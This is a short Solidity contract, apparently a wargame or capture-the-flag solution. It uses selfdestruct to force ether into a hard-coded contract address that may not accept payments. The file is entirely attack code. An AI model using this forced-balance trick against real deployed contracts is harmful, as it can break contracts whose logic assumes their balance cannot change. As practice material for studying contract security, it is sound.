// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackForce {
    address payable forceContractAddress = 0xc0E6F45D5dAB1E03106c5820a5eAD868a05a156c;

    constructor () public payable {

    }

    function attack() public {
        selfdestruct(forceContractAddress);
    }
}